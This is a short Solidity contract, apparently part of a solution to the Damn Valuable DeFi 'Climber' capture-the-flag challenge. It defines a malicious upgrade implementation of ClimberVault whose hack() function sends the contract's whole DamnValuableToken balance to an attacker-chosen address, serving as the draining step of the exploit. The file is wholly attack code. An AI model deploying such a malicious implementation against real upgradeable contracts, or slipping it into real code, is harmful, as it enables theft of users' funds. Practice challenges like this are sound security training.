pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./ClimberVault.sol";

contract AttackerImplementation is ClimberVault{
    

    function hack(address tokenAddress, address to) public{
        DamnValuableToken token = DamnValuableToken(tokenAddress);
        token.transfer(to, token.balanceOf(address(this)));
    }

}